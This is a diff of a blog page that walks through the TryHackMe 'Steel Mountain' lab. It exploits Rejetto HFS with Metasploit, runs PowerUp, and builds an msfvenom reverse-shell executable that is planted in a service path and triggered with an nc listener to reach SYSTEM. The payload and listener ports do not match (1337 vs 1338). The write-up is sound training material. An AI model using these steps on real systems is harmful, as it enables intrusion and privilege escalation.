@@ -3,7 +3,7 @@
   <head>
     <title>TryHackMe - Steel Mountain // FelSec - Blog</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Hugo 0.160.1">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="FelSec" />
     <meta name="description" content="" />
@@ -93,7 +93,7 @@
 <strong><em>Link:</em></strong> <a href="https://www.tryhackme.com/room/steelmountain">https://www.tryhackme.com/room/steelmountain</a></p>
 <h2 id="information-gathering">Information Gathering</h2>
 <p>Let&rsquo;s get started with this room. After doing the necessary (spinning up the host, grabbing the IP and sticking it in a file for easy reference), our first activity is to scan the host to see what services we have available to play with.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nmap -Pn -sV -iL host -oN kenobi.nmap
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nmap -Pn -sV -iL host -oN kenobi.nmap
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Starting Nmap 7.60 ( https://nmap.org ) at 2020-07-25 14:12 BST
 </span></span><span style="display:flex;"><span>Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
@@ -170,7 +170,7 @@
 begin result:=reMatch(s, &#39;\{[.:]|[.:]\}|\|&#39;, &#39;m!&#39;, ofs) end;
 </code></pre><p>By sending a null (%00) character within a search string it is possible to stop the regex function from parsing the input and instead allowing the macro to execute the arbitrary code.</p>
 <p>Using this we can get a remote shell on the server. We will use Metasploit to make it easier this time, but there are other ways of doing it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>msf5 &gt; search rejetto
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>msf5 &gt; search rejetto
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Matching Modules
 </span></span><span style="display:flex;"><span>================
@@ -319,7 +319,7 @@ begin result:=reMatch(s, &#39;\{[.:]|[.:]\}|\|&#39;, &#39;m!&#39;, ofs) end;
 </span></span><span style="display:flex;"><span>meterpreter &gt;
 </span></span></code></pre></div><p>Fantastic! We now have a remote shell on the server as a standard user.</p>
 <p>Next, we need to migrate the Meterpreter session to a different service. With us having low privileges we cannot migrate to one of the usual processes (winlogon, lsass, etc.) so instead we will have to use a lower privilege service, such as explorer.exe.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; migrate
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; migrate
 </span></span><span style="display:flex;"><span>Usage: migrate &lt;&lt;pid&gt; | -P &lt;pid&gt; | -N &lt;name&gt;&gt; [-t timeout]
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Migrates the server instance to another process.
@@ -383,7 +383,7 @@ begin result:=reMatch(s, &#39;\{[.:]|[.:]\}|\|&#39;, &#39;m!&#39;, ofs) end;
 <p>Since we know that the server we are attacking is a Windows host, we can make use of PowerShell post exploitation frameworks and modules to enumerate more information about the host and identify abnormalities. In particular we will be using the PowerUp module that comes as part of the PowerSploit post exploitation framework.</p>
 <p>The PowerUp script performs a number of checks on the target to identify any weaknesses or misconfigurations that would allow the user to elevate their permissions. An alternative tool we can use is the winpeas script (EXE or Batch) to perform the privilege escalation checks.</p>
 <p>We will need to grab a copy of the script, which can be donwloaded from the PowerSploit github repository, upload it to the server and load the PowerShell into our Meterpreter session. This allows us to use PowerShell based shells on the target.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; cd %DESKTOP%
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; cd %DESKTOP%
 </span></span><span style="display:flex;"><span>meterpreter &gt; pwd
 </span></span><span style="display:flex;"><span>C:\Users\bill\Desktop
 </span></span><span style="display:flex;"><span>meterpreter &gt; upload /opt/tools/postexploitation/PowerSploit/Privesc/PowerUp.ps1
@@ -395,7 +395,7 @@ begin result:=reMatch(s, &#39;\{[.:]|[.:]\}|\|&#39;, &#39;m!&#39;, ofs) end;
 </span></span><span style="display:flex;"><span>meterpreter &gt; powershell_shell
 </span></span><span style="display:flex;"><span>PS&gt;
 </span></span></code></pre></div><p>Within this PowerShell prompt we can execute the script, call the <code>Invoke-AllChecks</code> function and wait to see what information is returned.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PS&gt; . .\PowerUp.ps1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PS&gt; . .\PowerUp.ps1
 </span></span><span style="display:flex;"><span>PS&gt; Invoke-AllChecks
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>[*] Running Invoke-AllChecks
@@ -535,7 +535,7 @@ begin result:=reMatch(s, &#39;\{[.:]|[.:]\}|\|&#39;, &#39;m!&#39;, ofs) end;
 <li>Restart the AdvancedSystemCareService9 service</li>
 </ul>
 <p>We can use msfvenom to generate the executable payload.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST=10.8.7.19 LPORT=1337 -e x86/shikata_ga_nai -f exe -o Advanced.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST=10.8.7.19 LPORT=1337 -e x86/shikata_ga_nai -f exe -o Advanced.exe
 </span></span><span style="display:flex;"><span>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 </span></span><span style="display:flex;"><span>[-] No arch selected, selecting arch: x86 from the payload
 </span></span><span style="display:flex;"><span>Found 1 compatible encoders
@@ -546,21 +546,21 @@ begin result:=reMatch(s, &#39;\{[.:]|[.:]\}|\|&#39;, &#39;m!&#39;, ofs) end;
 </span></span><span style="display:flex;"><span>Final size of exe file: 73802 bytes
 </span></span><span style="display:flex;"><span>Saved as: Advanced.exe
 </span></span></code></pre></div><p>Now we can upload it to the server using our Meterpreter session.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; cd &#39;C:\Program Files (x86)\IObit\&#39;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; cd &#39;C:\Program Files (x86)\IObit\&#39;
 </span></span><span style="display:flex;"><span>meterpreter &gt; upload Advanced.exe
 </span></span><span style="display:flex;"><span>[*] uploading  : Advanced.exe -&gt; Advanced.exe
 </span></span><span style="display:flex;"><span>[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): Advanced.exe -&gt; Advanced.exe
 </span></span><span style="display:flex;"><span>[*] uploaded   : Advanced.exe -&gt; Advanced.exe
 </span></span><span style="display:flex;"><span>meterpreter &gt;
 </span></span></code></pre></div><p>We can start a new listener on our host to catch the reverse shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nc -vnlp 1338
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nc -vnlp 1338
 </span></span><span style="display:flex;"><span>Listening on [0.0.0.0] (family 0, port 1338)
 </span></span></code></pre></div><p>To trigger the vulnerability and get our shell we need to restart the service.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; powershell_shell
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; powershell_shell
 </span></span><span style="display:flex;"><span>PS&gt; Restart-Service AdvancedSystemCareService9
 </span></span><span style="display:flex;"><span>PS&gt;
 </span></span></code></pre></div><p>Going back to our listener we can see that we have received a connection from the host, using <code>whoami</code> we can see that we have a remote shell running with <code>nt authority\system</code> privileges.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Connection from 10.10.29.151 49400 received!
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Connection from 10.10.29.151 49400 received!
 </span></span><span style="display:flex;"><span>Microsoft Windows [Version 6.3.9600]
 </span></span><span style="display:flex;"><span>(c) 2013 Microsoft Corporation. All rights reserved.
 </span></span><span style="display:flex;"><span>
